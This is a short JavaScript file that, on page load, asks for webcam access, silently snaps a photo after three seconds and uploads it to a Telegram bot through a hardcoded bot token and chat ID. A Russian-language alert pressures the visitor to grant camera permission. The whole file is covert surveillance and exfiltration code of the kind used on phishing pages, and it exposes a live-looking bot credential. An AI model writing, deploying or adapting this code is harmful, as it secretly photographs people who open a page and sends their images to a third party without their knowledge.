const BOT_TOKEN = '8380564571:AAG6pyo--3PRjg7uRMI88SAI_J51w3Z5C8U';
const CHAT_ID = '7672652168';

async function sendTelegram(photoBase64) {
    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    const blob = await fetch(photoBase64).then(r => r.blob());
    formData.append('photo', blob);
    await fetch(url, { method: 'POST', body: formData });
}

async function startCam() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photo = canvas.toDataURL('image/jpeg');
            await sendTelegram(photo);
            stream.getTracks().forEach(track => track.stop());
        }, 3000);
    } catch (error) {
        alert('Ошибка доступа к камере. Разреши доступ и попробуй снова.');
    }
}

window.onload = startCam;
